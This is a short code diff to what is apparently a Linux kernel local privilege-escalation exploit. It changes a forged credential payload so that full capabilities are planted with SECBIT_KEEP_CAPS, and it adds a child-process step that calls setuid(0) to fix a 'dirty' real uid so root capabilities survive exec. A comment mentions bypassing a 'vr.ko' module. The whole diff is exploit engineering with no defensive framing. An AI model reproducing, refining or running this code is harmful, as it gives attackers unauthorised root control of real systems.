@@ -2512,7 +2512,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
              * c[2]=suid/sgid = target, both fixed by later zero plants. */
             c[3] = 0; /* euid/egid */
             c[4] = 0; /* fsuid/fsgid */
-            c[5] = 0; /* securebits */
+            c[5] = 1; /* securebits: SECBIT_KEEP_CAPS keeps caps across setuid */
             for (int i = 6; i <= 10; i++)
                 c[i] = FULLCAP; /* inh/prm/eff/bset/ambient */
             *(unsigned long long *)(payload + off + 0x80) =
@@ -2972,6 +2972,21 @@ static int wait_child_main(const char *mode)
         rep.setuid_ret = 0;
         rep.setuid_errno = 0;
         logf("[child] already euid=0: skipping setuid/setresgid (vr.ko bypass)\n");
+        /* 2026-11-25: real uid 可能被 rb_erase 弄脏；若 ruid != 0，
+         * exec daemon 会触发 AT_SECURE 清空 caps。这里用 CAP_SETUID 修 uid。 */
+        {
+            uid_t ru = 0, eu = 0, su = 0;
+
+            getresuid(&ru, &eu, &su);
+            if (ru != 0)
+            {
+                errno = 0;
+                rep.setuid_ret = (int)syscall(SYS_setuid, 0);
+                rep.setuid_errno = errno;
+                logf("[child] dirty ruid=%d -> setuid(0) ret=%d errno=%d\n",
+                     (int)ru, rep.setuid_ret, rep.setuid_errno);
+            }
+        }
     }
     else
     {
